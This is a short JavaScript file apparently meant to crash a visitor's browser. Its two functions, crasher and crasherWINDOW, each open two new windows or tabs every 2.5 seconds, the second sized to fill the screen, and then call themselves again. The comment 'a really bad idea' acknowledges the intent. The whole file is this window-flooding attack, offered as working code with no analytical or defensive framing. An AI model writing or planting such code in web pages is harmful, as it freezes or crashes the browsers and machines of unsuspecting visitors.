function crasher() {
  setTimeout(() => {
  window.open("opener.html")
  window.open("opener.html")
  // a really bad idea
  crasher()
}, 2500)
}

function crasherWINDOW() {
  setTimeout(() => {
  window.open("openerWINDOW.html", "_blank", "width=" + window.outerWidth + ",height=" + window.outerHeight)
  window.open("openerWINDOW.html", "_blank", "width=" + window.outerWidth + ",height=" + window.outerHeight)
  // a really bad idea
  crasherWINDOW()
}, 2500)
}
